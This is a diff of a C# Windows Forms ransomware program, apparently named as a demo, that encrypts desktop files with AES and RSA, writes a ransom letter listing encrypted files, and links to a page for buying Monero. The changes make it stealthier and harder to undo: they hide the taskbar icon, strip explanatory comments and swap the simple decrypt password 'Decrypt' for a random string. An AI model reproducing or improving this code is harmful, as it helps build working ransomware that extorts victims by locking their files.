@@ -48,7 +48,7 @@ namespace RanWare_Demomot
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            //this.ShowInTaskbar = false;//Pas d'îcone dans la barre des tâches
+            this.ShowInTaskbar = false;//Pas d'îcone dans la barre des tâches
 
             if (ENCRYPT_DESKTOP)
             {
@@ -71,7 +71,6 @@ namespace RanWare_Demomot
             {
                 ransomLetter(filesName);//Crée un fichier texte affichant tous les fichiers encryptés
             }
-            //this.WindowState = FormWindowState.Maximized;//Met le programme en plein ecran
         }
 
         /// <summary>
@@ -125,14 +124,6 @@ namespace RanWare_Demomot
                 byte[] LenK = BitConverter.GetBytes(lKey);
                 int lIV = aes.IV.Length;
                 byte[] LenIV = BitConverter.GetBytes(lIV);
-
-                // Write the following to the FileStream
-                // for the encrypted file (outFs):
-                // - length of the key
-                // - length of the IV
-                // - ecrypted key
-                // - the IV
-                // - the encrypted cipher content
 
                 // Crée le nouveau fichier encrypter
                 string testPath = Path.GetFullPath(inputFile.FullName);
@@ -196,7 +187,6 @@ namespace RanWare_Demomot
                 decryptFolderFiles(d);
             }
         }
-
         /// <summary>
         /// Quand l'utilisateur clique sur le bouton decrypt, si le mot de passe est le bon, va appeler la methode qui va chercher tous le fichiers d'un répertoire et les envoyer à la methode qui les encrypte
         /// </summary>
@@ -204,7 +194,7 @@ namespace RanWare_Demomot
         /// <param name="e"></param>
         private void btnDecrypt_Click(object sender, EventArgs e)
         {
-            if (txtBoxInput.Text == "Decrypt")
+            if (txtBoxInput.Text == "SqBmxsihdA6heaVOI3VG")
             {
                 if (DECRYPT_DESKTOP)
                 {
@@ -251,8 +241,7 @@ namespace RanWare_Demomot
             //Crée le fichier non encrypté
             string outFile = Path.ChangeExtension(file.FullName.Replace(".titi", ".titi"), "");
 
-            //Utilise FileStream pour lire le fichier encrypté
-            // Use FileStream objects to read the encrypted
+            // Utilise FileStream pour lire le fichier encrypté
             // file (inFs) and save the decrypted file (outFs).
             using (var inFs = new FileStream(file.FullName, FileMode.Open))
             {
@@ -285,7 +274,7 @@ namespace RanWare_Demomot
                 inFs.Seek(8 + lenK, SeekOrigin.Begin);
                 inFs.Read(IV, 0, lenIV);
 
-                //Directory.CreateDirectory(DecrFolder);
+                //  Directory.CreateDirectory(DecrFolder);
                 // Use RSACryptoServiceProvider
                 // to decrypt the AES key.
                 byte[] KeyDecrypted = rsa.Decrypt(KeyEncrypted, false);
@@ -293,10 +282,6 @@ namespace RanWare_Demomot
                 //Decrypte la clef
                 ICryptoTransform transform = aes.CreateDecryptor(KeyDecrypted, IV);
 
-                // Decrypt the cipher text from
-                // from the FileSteam of the encrypted
-                // file (inFs) into the FileStream
-                // for the decrypted file (outFs).
                 using (var outFs = new FileStream(outFile, FileMode.Create))
                 {
                     int count = 0;
@@ -341,7 +326,6 @@ namespace RanWare_Demomot
             {
                 fi.Delete();
             }
-            //StreamWriter ransomWriter = new StreamWriter(Desktop + @"\RECOVER_FILES.txt");
 
             using (FileStream fs = fi.Create())
             {
@@ -380,7 +364,7 @@ namespace RanWare_Demomot
         private void VisitLink()
         {
             linkLabel1.LinkVisited = true;
-            System.Diagnostics.Process.Start("https://www.binance.com/en/buy-monero");
+            Process.Start(new ProcessStartInfo("https://www.binance.com/en/buy-monero") { UseShellExecute = true});
         }
 
         /// <summary>
